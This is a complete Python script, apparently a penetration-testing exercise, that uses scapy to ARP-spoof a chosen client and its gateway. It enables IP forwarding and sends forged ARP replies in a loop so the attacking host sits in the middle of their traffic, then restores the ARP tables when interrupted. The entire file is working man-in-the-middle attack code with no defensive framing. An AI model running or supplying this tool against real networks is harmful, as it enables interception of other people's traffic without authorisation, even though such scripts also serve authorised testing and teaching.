#!/usr/bin/env python3

import time
import scapy.all as scapy
import optparse
import subprocess


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option('-t', '--target', dest='target', help="Router IP/ Gateway IP")
    parser.add_option('-d', '--destination', dest='destination', help="Destination IP/ Client IP")
    (options, arguments) = parser.parse_args()
    return options


value = get_arguments()
target_ip = value.destination
gateway_ip = value.target


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast / arp_request
    # arp_request_broadcast.show()
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    client = answered_list[0]
    return client[1].hwsrc


def arpspoof(source_ip, dest_ip):
    target_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, hwdst=target_mac, pdst=source_ip, psrc=dest_ip)
    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)

    # packet.show()
    # print(packet.summary())
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False, count=4)


count = 0
try:
    print('[+] Started ARP Spoofing')
    while True:
        arpspoof(target_ip, gateway_ip)
        time.sleep(2)
        arpspoof(gateway_ip, target_ip)
        count = count + 2
        print(f'\r [+] Sent {count} packets', end='')

except KeyboardInterrupt:
    print('\n \n [-] Detected CTRL+C .. Restoring and Quiting')
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    subprocess.call("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)
